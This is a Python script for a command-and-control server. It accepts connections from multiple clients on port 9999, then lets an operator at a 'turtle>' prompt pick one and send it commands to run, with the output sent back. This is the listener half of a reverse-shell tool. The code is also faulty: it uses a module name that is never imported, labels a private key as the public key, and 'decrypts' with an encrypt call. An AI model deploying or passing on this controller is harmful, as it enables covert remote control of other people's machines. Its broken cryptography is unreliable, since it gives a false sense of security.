import socket
import threading
from queue import Queue
import hashlib
from imported_files import des, en_de_functions, reformat_length

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []
all_address = []
name = []
name_index = []
key_ring = []
e, d, m = imported_files.rsa.keygen()
ser_prv_key = f'|{d}|{m}|'
ser_pub_key = (e, m)
print(f'server keys {e} {d} {m}')


# Create a socket(connect two computers)
def create_socket():
    try:
        global host
        global port
        global s
        host = ''
        port = 9999
        s = socket.socket()

    except socket.error as err:
        print("Socket creation error: ", str(err))


# Binding socket and listening for connections
def bind_socket():
    try:
        global host
        global port
        global s

        print(f'Binding the code: {port}')
        # binds the host and port to the socket
        s.bind((host, port))
        s.listen(5)  # tolerates 5 bad connections until if shows an error

    except socket.error as err:
        print(f'Socket binding error: {err}\nRetrying')
        bind_socket()


# Handling connections from multiple clients and saving conn, add into the list
# closing previous connections when server.py file is restarted
def accepting_connections():
    for c in all_connections:
        c.close()

    del all_connections[:]
    del all_address[:]

    while True:
        try:
            conn, address = s.accept()
            n = str(conn.recv(1024), 'utf-8')
            m = str(conn.recv(1024), 'utf-8')
            s.setblocking(True)  # Prevents timeout from happening

            all_connections.append(conn)
            all_address.append(address)
            name.append(n)
            name_index.append(False)
            m = m.split(' ')
            # print(m)
            key_ring.append(m)  # m is the des key in str format
            print(f'Connection has been established to {address[0]} | Client "{n}" | Private key received')

        except:
            print("Error accepting a client's connections")


# and thread functions 1) see all the clients 2) select a client 3) send commands to connected client
# Interactive prompt for sending commands
def start_turtle():  # turtle is the name given to command prompt
    while True:
        cmd = input('turtle> ')
        if cmd == 'list':
            list_connections()

        elif 'select' in cmd:
            conn, target = get_target(cmd)
            if conn is not None:  # checks if the connection object exists or not
                send_target_commands(conn, target)
        else:
            print('Command not recognised')


# display all active connections with the client
def list_connections():
    results = ''

    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(1024)  # don't know the size of receiving data of dummy connection
        except:
            del all_connections[i]
            del key_ring[i]
            del all_address[i]
            del name[i]
            del name_index[i]
            continue

        results = results + f'{i}  {all_address[i][0]}  {all_address[i][1]}  Client name: {name[i]}\n'

    print('--------------Clients--------------')
    print(results)


# Selecting the target
def get_target(cmd):
    try:
        target = int(cmd.replace('select ', ''))  # id
        conn = all_connections[target]
        print(f'You are now connected to {all_address[target][0]} {all_address[target][1]} | Client "{name[target]}"')
        return conn, target
    except:
        print('Selection not valid')


# Sends commands to client
def send_target_commands(conn, target):
    if not name_index[target]:
        conn.send(str.encode(ser_prv_key))
        name_index[target] = True
        print(f"Server's public key sent to {name[target]}")
    while True:
        try:
            cmd = input('server> ')
            if cmd == 'quit':
                break

            if len(str.encode(cmd)) > 0:
                cmd = en_de_functions.encrypt(cmd, ser_pub_key)
                conn.send(str.encode(cmd))  # Sends data to other computer
                client_response = str(conn.recv(1024), 'utf-8')
                data, data_hash = client_response.split('|||')
                result = hashlib.sha256(data.encode())
                result = result.hexdigest()
                if result != data_hash:
                    print('Hash does not match\nClient disconnected!\nBack to turtle server')
                    break

                # print(data)
                client_response = reformat_length._original_len(des.bin2hex(des.encrypt(data, key_ring[target])))
                # print('decrypted client response successfull')
                print(f'{name[target]}> {client_response}')
        except:
            print('Error sending/receiving commands\nDisconnected from Client\nBack to turtle server')
            break


# create worker threads
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)  # creating the thread
        t.daemon = True  # clears up space and ends the thread
        t.start()  # Start the server


# do next job that is in the queue(handle connections, send commands)
def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accepting_connections()
        if x == 2:
            start_turtle()

        queue.task_done()


def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)  # puts elements in the queue
    queue.join()


create_workers()
create_jobs()
